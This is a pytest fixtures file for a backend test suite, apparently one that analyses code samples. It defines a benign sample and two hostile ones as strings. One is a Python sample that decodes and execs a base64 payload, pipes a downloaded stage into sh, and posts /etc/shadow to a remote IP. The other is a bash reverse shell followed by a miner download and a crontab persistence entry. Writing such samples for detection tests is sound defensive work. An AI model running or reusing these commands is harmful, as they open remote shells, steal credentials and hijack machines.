"""Shared pytest fixtures for the OriginTrace backend test suite."""
import os
import sys
from pathlib import Path
from typing import Callable

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

# Keep the suite hermetic: never talk to Gemini and never load the heavy
# FAISS / sentence-transformers stack unless a test opts in explicitly.
os.environ.pop("GEMINI_API_KEY", None)
os.environ.setdefault("ORIGINTRACE_PROVENANCE", "lexical")
os.environ.setdefault("MOCK_DELAY_S", "0")


MALICIOUS_PYTHON = '''#!/usr/bin/env python3
import os
import base64
import requests
from subprocess import Popen

C2 = "http://185.220.101.7/drop/stage2.bin"
PAYLOAD = "aW1wb3J0IHNvY2tldDtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIxODUuMjIwLjEwMS43Iiw0NDQzKSk7"

def run():
    exec(base64.b64decode(PAYLOAD))
    os.system("curl -s " + C2 + " | sh")
    requests.post("http://185.220.101.7/exfil", data=open("/etc/shadow").read())

run()
'''

REVERSE_SHELL = """#!/bin/bash
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
wget http://203.0.113.9/miner -O /tmp/.x && chmod +x /tmp/.x
(crontab -l; echo "* * * * * /tmp/.x") | crontab -
"""

BENIGN_PYTHON = '''"""A harmless helper."""
import math


def area(radius: float) -> float:
    return math.pi * radius * radius
'''


@pytest.fixture
def write_sample(tmp_path: Path) -> Callable[[str, bytes | str], Path]:
    """Return a helper that writes a sample file into the test tmp dir."""

    def _write(name: str, content: bytes | str) -> Path:
        path = tmp_path / name
        # Always write bytes: text mode would translate newlines on Windows
        # and change the sample's hash.
        path.write_bytes(content.encode("utf-8") if isinstance(content, str) else content)
        return path

    return _write
